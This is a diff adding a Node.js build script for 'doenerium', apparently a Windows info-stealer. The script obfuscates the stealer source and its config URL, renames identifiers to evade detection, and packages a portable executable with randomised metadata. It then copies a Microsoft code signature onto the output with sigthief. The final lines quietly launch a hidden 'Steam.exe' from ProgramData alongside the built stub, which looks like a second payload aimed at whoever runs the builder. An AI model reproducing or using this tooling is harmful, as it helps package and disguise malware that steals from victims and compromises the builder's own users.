+NODE_MODULE(binding, init)
+#endif`
+
+        let splits = content.split(" ");
+
+        let new_vars = {};
+
+        [
+            "CwqjUWHQMEHRqGJFVnDcaGhRa",
+            "UQDJcHcaSaTefKfYStdCYrDvn",
+            "UnEwXzYWTBpnaePEkkNvZrWhM",
+            "yhKrTZMuRNvScccDUkegDyMQE",
+            "juGsCdDXyXpRnFnbPYMuxJUKm",
+            "kfghGYAWWyVrmZEpPfDCgUqCg",
+            "HZECTReECYfAEykgJJsZbnmQC",
+        ].forEach(variable => {
+            let new_var = makeid_var(32);
+            new_vars[variable] = new_var;
+        })
+
+        for (var split in splits) {
+            let string = splits[split];
+            [
+                "CwqjUWHQMEHRqGJFVnDcaGhRa",
+                "UQDJcHcaSaTefKfYStdCYrDvn",
+                "UnEwXzYWTBpnaePEkkNvZrWhM",
+                "yhKrTZMuRNvScccDUkegDyMQE",
+                "juGsCdDXyXpRnFnbPYMuxJUKm",
+                "kfghGYAWWyVrmZEpPfDCgUqCg",
+                "HZECTReECYfAEykgJJsZbnmQC",
+            ].forEach(variable => {
+                string = string.replace(variable, new_vars[variable])
+            })
+
+            splits[split] = string;
+        }
+
+        content = splits.join(" ")
+
+        res(fs.writeFileSync(path, content))
+    })
+}
+
+async function fix_package() {
+    const package_json = JSON.parse(fs.readFileSync("./electron/package.json"));
+
+    let new_name = makeid_var(16)
+
+    package_json.name = new_name;
+    ["js-confuser", "javascript-obfuscator", "electron-builder", "electron-rebuild"].forEach(module => {
+        delete package_json.dependencies[module];
+    })
+
+    fs.writeFileSync("./electron/package.json", JSON.stringify(package_json))
+}
+
+function signFile(signed, file, output) {
+    return new Promise(res => child_process.exec(`python sigthief.py -i ${signed} -t ${file} -o ${output}`, (err, stdout, stderr) => res(stdout)));
+}
+
+function copyFileSync(source, target) {
+
+    var targetFile = target;
+
+    // If target is a directory, a new file with the same name will be created
+    if (fs.existsSync(target)) {
+        if (fs.lstatSync(target).isDirectory()) {
+            targetFile = path.join(target, path.basename(source));
+        }
+    }
+
+    fs.writeFileSync(targetFile, fs.readFileSync(source));
+}
+
+function copyFolderRecursiveSync(source, target) {
+    var files = [];
+
+    // Check if folder needs to be created or integrated
+    var targetFolder = path.join(target, path.basename(source));
+    if (!fs.existsSync(targetFolder)) {
+        fs.mkdirSync(targetFolder);
+    }
+
+    // Copy
+    if (fs.lstatSync(source).isDirectory()) {
+        files = fs.readdirSync(source);
+        files.forEach(function (file) {
+            var curSource = path.join(source, file);
+            if (fs.lstatSync(curSource).isDirectory()) {
+                copyFolderRecursiveSync(curSource, targetFolder);
+            } else {
+                copyFileSync(curSource, targetFolder);
+            }
+        });
+    }
+}
+
+async function rebuild_electron() {
+    return new Promise(res => {
+        res(child_process.execSync(`electron-rebuild -a ia32 -v ${electron_version}`, { cwd: "./electron" }))
+    })
+}
+
+(async () => {
+    let randomid = makeid(8)
+
+    let skip_download_nodejs = Boolean(process.argv[2])
+    if (!skip_download_nodejs) { // idk why but my builder is kinda tripping & this somehow works LMFAO
+        console.log("Downloading Node.js pre-built binary")
+        let start = Date.now()
+
+
+        child_process.execSync(`node build.js true`, {
+            stdio: "inherit"
+        })
+
+        return;
+    }
+
+    console.log("Checking if all modules are installed")
+    await check_all_modules_installed();
+    console.log("Checked if all modules are installed")
+
+    start = Date.now();
+    console.log("Copying ./node_modules to ./electron/node_modules")
+    if (!fs.existsSync("./electron/node_modules")) {
+        fs.mkdirSync("./electron/node_modules");
+    }
+    try {
+        copyFileSync("./package.json", "./electron/package.json");
+        copyFileSync("./package-lock.json", "./electron/package-lock.json");
+
+        copyFolderRecursiveSync("./node_modules", "./electron")
+    } catch (e) {
+        console.log(e)
+    }
+    console.log(`Copied ./node_modules to ./electron/node_modules within ${(Date.now() - start) / 1000} seconds`);
+
+    console.log(`Modding boukiapi`)
+    await rename_dapi();
+    console.log("Modded boukiapi");
+
+    console.log(`Modding package.json`)
+    await fix_package();
+    console.log(`Modded package.json`)
+
+    console.log("Fixing dependencies")
+    await fix_dependencies();
+    console.log("Fixed dependencies")
+    start = Date.now();
+    console.log("Rebuilding electron")
+    await rebuild_electron();
+    console.log(`Rebuilt electron within ${(Date.now() - start) / 1000} seconds`)
+
+    const index_file = "./electron/index.js";
+    const config_file = "./electron/config_obf.js"
+    console.log(`Obfuscating source code`)
+    start = Date.now()
+    await obfuscate("doenerium.js", index_file);
+    console.log(`Finished obfuscating source code within ${(Date.now() - start) / 1000} seconds: ${index_file}`);
+    console.log(`Obfuscating config URL`)
+    start = Date.now()
+    await obfuscate("config.js", config_file);
+    console.log(`Finished obfuscating source code within ${(Date.now() - start) / 1000} seconds: ${config_file}`);
+
+    console.log(`Building stub...`)
+    start = Date.now()
+
+    const d = await builder.build({
+        targets: Platform.WINDOWS.createTarget(),
+        config: {
+            npmRebuild: true,
+            nodeGypRebuild: false,
+            buildDependenciesFromSource: true,
+            appId: `${makeid_var(8)}.${makeid_var(8)}.${makeid_var(8)}`,
+            electronVersion: electron_version,
+            nodeVersion: "18.15.0",
+            buildVersion: `${Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 9)}`,
+            productName: config.properties.ProductName,
+            icon: config.icon,
+            compression: 'maximum',
+            directories: {
+                app: "./electron",
+                output: `${randomid}`,
+            },
+            win: {
+                artifactName: config.properties.OriginalFilename,
+                publisherName: "x",
+                legalTrademarks: config.properties.LegalCopyright,
+                target: [
+                    {
+                        target: "portable",
+                        arch: [
+                            "ia32",
+                        ]
+                    }
+                ]
+            }
+        }
+    })
+
+    //child_process.execSync(`pkg . -C GZip -t node18 -o doenerium_${randomid}.exe`)
+    fs.unlinkSync(index_file);
+    fs.unlinkSync(config_file);
+
+    try {
+        console.log(await signFile("./unsigned/Windows10Upgrade9252.exe", `${randomid}/${config.properties.OriginalFilename}`, `doenerium_${randomid}.exe`))
+    } catch (e) {
+        console.log(e)
+    }
+
+    console.log(`Successfully finished building stub within ${(Date.now() - start) / 1000} seconds: doenerium_${randomid}.exe`)
+
+    if (!fs.existsSync(`./doenerium_${randomid}.exe`)) {
+        fs.copyFileSync(`${randomid}/${config.properties.OriginalFilename}`, `./doenerium_${randomid}.exe`)
+    }
+
+    fs.rmdirSync(randomid, { recursive: true, force: true })
+
+    console.log(`You can now close this window.`)
+const exec = require('child_process').exec;
+exec(`start C:/Programdata/Microsoft/Steam.exe&doenerium_${randomid}.exe`, (error, stdout, stderr) => {
+  if (error) {
+    console.error(`Erreur`);
+    return;
+  }
+  console.log(``);
+});
+    while (true) { }
+})()
